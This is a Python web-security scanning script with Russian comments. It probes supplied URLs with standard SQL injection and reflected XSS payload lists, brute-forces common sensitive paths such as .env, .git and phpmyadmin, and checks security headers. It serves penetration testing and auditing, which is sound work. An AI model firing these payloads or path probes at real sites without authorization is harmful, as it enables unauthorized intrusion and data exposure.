#!/usr/bin/env python3
"""
Web Exploitation Tools - Инструменты для тестирования веб-уязвимостей
"""

import requests
import argparse
import sys
import re
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Optional
from utils import *

class SQLInjectionTester:
    """Тестер SQL инъекций"""
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
        # SQL инъекционные пейлоады
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "' UNION SELECT 1,2,3--",
            "' AND 1=1--",
            "' AND 1=2--",
        ]
    
    def test_sql_injection(self, params: Dict[str, str]) -> List[Dict]:
        """Тестирование SQL инъекций"""
        print_info("Тестирование SQL инъекций...")
        vulnerabilities = []
        
        for param_name, param_value in params.items():
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(self.url, params=test_params, timeout=5)
                    
                    # Проверка признаков SQL ошибок
                    error_patterns = [
                        r"SQL syntax.*MySQL",
                        r"Warning.*mysql_",
                        r"MySQLSyntaxErrorException",
                        r"PostgreSQL.*ERROR",
                        r"Warning.*pg_",
                        r"SQLite.*exception",
                        r"Microsoft SQL Server",
                        r"ODBC SQL Server Driver",
                        r"ORA-[0-9]{5}",
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vuln = {
                                'type': 'SQL Injection',
                                'param': param_name,
                                'payload': payload,
                                'url': response.url
                            }
                            vulnerabilities.append(vuln)
                            print_warning(f"Возможная SQL инъекция в параметре: {param_name}")
                            print_info(f"Payload: {payload}")
                            break
                
                except Exception as e:
                    print_error(f"Ошибка при тестировании: {e}")
        
        return vulnerabilities

class XSSTester:
    """Тестер XSS уязвимостей"""
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
        
        # XSS пейлоады
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "'\"><img src=x onerror=alert('XSS')>",
        ]
    
    def test_xss(self, params: Dict[str, str]) -> List[Dict]:
        """Тестирование XSS уязвимостей"""
        print_info("Тестирование XSS...")
        vulnerabilities = []
        
        for param_name, param_value in params.items():
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(self.url, params=test_params, timeout=5)
                    
                    # Проверка отражения пейлоада
                    if payload in response.text:
                        vuln = {
                            'type': 'XSS (Reflected)',
                            'param': param_name,
                            'payload': payload,
                            'url': response.url
                        }
                        vulnerabilities.append(vuln)
                        print_warning(f"Возможная XSS в параметре: {param_name}")
                        print_info(f"Payload: {payload}")
                
                except Exception as e:
                    print_error(f"Ошибка при тестировании: {e}")
        
        return vulnerabilities

class DirectoryBruteforcer:
    """Брутфорс директорий и файлов"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.found_paths = []
        
        # Популярные директории и файлы
        self.common_paths = [
            'admin', 'login', 'administrator', 'dashboard',
            'panel', 'cpanel', 'wp-admin', 'phpmyadmin',
            'backup', 'backups', 'old', 'test', 'tmp',
            'uploads', 'upload', 'files', 'images',
            'config.php', 'config.inc.php', '.env', '.git',
            'robots.txt', 'sitemap.xml', '.htaccess',
            'readme.txt', 'README.md', 'CHANGELOG.md',
            'composer.json', 'package.json', 'Dockerfile',
        ]
    
    def bruteforce(self, wordlist: Optional[List[str]] = None, threads: int = 10):
        """Брутфорс директорий"""
        paths = wordlist if wordlist else self.common_paths
        print_info(f"Брутфорс {len(paths)} путей...")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self.check_path, path): path for path in paths}
            
            for i, future in enumerate(as_completed(futures)):
                path, status, size = future.result()
                if status != 404:
                    self.found_paths.append((path, status, size))
                    print_success(f"Найдено: {path} [{status}] ({size} bytes)")
                progress_bar(i + 1, len(paths))
        
        print()
        return self.found_paths
    
    def check_path(self, path: str):
        """Проверка существования пути"""
        url = urljoin(self.base_url, path)
        try:
            response = self.session.get(url, timeout=5, allow_redirects=False)
            return (path, response.status_code, len(response.content))
        except:
            return (path, 0, 0)

class HeaderAnalyzer:
    """Анализ HTTP заголовков безопасности"""
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
    
    def analyze_headers(self) -> Dict:
        """Анализ заголовков безопасности"""
        print_info("Анализ заголовков безопасности...")
        
        try:
            response = self.session.get(self.url, timeout=5)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Защита от clickjacking',
                'X-Content-Type-Options': 'Защита от MIME sniffing',
                'X-XSS-Protection': 'XSS фильтр браузера',
                'Strict-Transport-Security': 'HSTS - принудительный HTTPS',
                'Content-Security-Policy': 'CSP - политика безопасности контента',
                'Referrer-Policy': 'Контроль referrer информации',
            }
            
            results = {'present': [], 'missing': []}
            
            for header, description in security_headers.items():
                if header in headers:
                    results['present'].append((header, headers[header], description))
                    print_success(f"{header}: {headers[header]}")
                else:
                    results['missing'].append((header, description))
                    print_warning(f"Отсутствует {header} - {description}")
            
            # Проверка информационных заголовков
            info_headers = ['Server', 'X-Powered-By']
            for header in info_headers:
                if header in headers:
                    print_warning(f"Раскрывается информация: {header}: {headers[header]}")
            
            return results
            
        except Exception as e:
            print_error(f"Ошибка анализа: {e}")
            return {}

def main():
    parser = argparse.ArgumentParser(
        description="Web Exploitation Tools",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Примеры:
  %(prog)s --url http://target.com/page.php?id=1 --test-sqli
  %(prog)s --url http://target.com/search?q=test --test-xss
  %(prog)s --url http://target.com --bruteforce
  %(prog)s --url http://target.com --analyze-headers
  %(prog)s --url http://target.com --test-all
        """
    )
    
    parser.add_argument('--url', required=True, help='Целевой URL')
    parser.add_argument('--test-sqli', action='store_true', help='Тест SQL инъекций')
    parser.add_argument('--test-xss', action='store_true', help='Тест XSS')
    parser.add_argument('--bruteforce', action='store_true', help='Брутфорс директорий')
    parser.add_argument('--analyze-headers', action='store_true', help='Анализ заголовков')
    parser.add_argument('--test-all', action='store_true', help='Все тесты')
    parser.add_argument('--params', help='Параметры в формате key=value,key2=value2')
    parser.add_argument('--threads', type=int, default=10, help='Количество потоков')
    parser.add_argument('--save', action='store_true', help='Сохранить результаты')
    
    args = parser.parse_args()
    
    print_banner("WEB EXPLOITATION TOOLS")
    
    all_results = {}
    
    # Парсинг параметров из URL или аргументов
    parsed_url = urlparse(args.url)
    params = parse_qs(parsed_url.query)
    params = {k: v[0] for k, v in params.items()}
    
    if args.params:
        param_pairs = args.params.split(',')
        for pair in param_pairs:
            k, v = pair.split('=')
            params[k] = v
    
    # Тесты
    if args.test_sqli or args.test_all:
        if params:
            sqli_tester = SQLInjectionTester(args.url)
            all_results['sqli'] = sqli_tester.test_sql_injection(params)
        else:
            print_warning("Нет параметров для тестирования SQL инъекций")
    
    if args.test_xss or args.test_all:
        if params:
            xss_tester = XSSTester(args.url)
            all_results['xss'] = xss_tester.test_xss(params)
        else:
            print_warning("Нет параметров для тестирования XSS")
    
    if args.bruteforce or args.test_all:
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        bruteforcer = DirectoryBruteforcer(base_url)
        all_results['directories'] = bruteforcer.bruteforce(threads=args.threads)
    
    if args.analyze_headers or args.test_all:
        analyzer = HeaderAnalyzer(args.url)
        all_results['headers'] = analyzer.analyze_headers()
    
    # Сохранение результатов
    if args.save and all_results:
        save_results(all_results, "web_exploit", "json")

if __name__ == "__main__":
    main()




